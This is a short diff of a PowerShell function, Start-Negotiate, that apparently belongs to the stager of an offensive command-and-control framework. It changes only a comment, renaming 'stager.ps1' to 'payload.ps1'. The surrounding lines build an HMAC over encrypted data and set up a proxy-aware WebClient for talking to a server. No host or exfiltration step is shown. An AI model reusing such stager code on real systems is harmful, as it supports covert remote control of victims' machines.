@@ -83,7 +83,7 @@ function Start-Negotiate {
     $eb=$eb+$hmac.ComputeHash($eb)[0..9];
 
     # if the web client doesn't exist, create a new web client and set appropriate options
-    #   this only happens if this stager.ps1 code is NOT called from a launcher context
+    #   this only happens if this payload.ps1 code is NOT called from a launcher context
     if(-not $wc) {
         $wc=New-Object System.Net.WebClient;
         # set the proxy settings for the WC to be the default system settings
